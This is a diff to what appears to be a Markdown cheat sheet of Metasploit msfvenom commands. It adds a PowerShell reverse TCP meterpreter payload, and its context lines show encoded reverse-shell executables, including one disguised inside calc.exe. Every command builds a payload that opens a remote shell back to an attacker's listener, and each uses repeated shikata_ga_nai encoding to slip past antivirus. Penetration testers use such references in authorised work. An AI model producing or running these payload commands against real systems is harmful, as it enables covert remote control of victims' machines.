@@ -11,11 +11,16 @@ msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LP
 ```
 msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o meterpreter.exe
 ```
+##### Powershell Reverse TCP
+```
+msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.5.64 LPORT=443 -e x86/shikata_ga_nai -i 10 -f powershell -o meterpreter.ps1```
+```
 
 ##### Add Windows Calc.exe as a template:
 ```
 msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -x calc.exe -e x86/shikata_ga_nai -i 10 -f exe -o meterpreter.exe
 ```
+
 
 ##### Reverse HTTPS with proxy authentication:
 ```
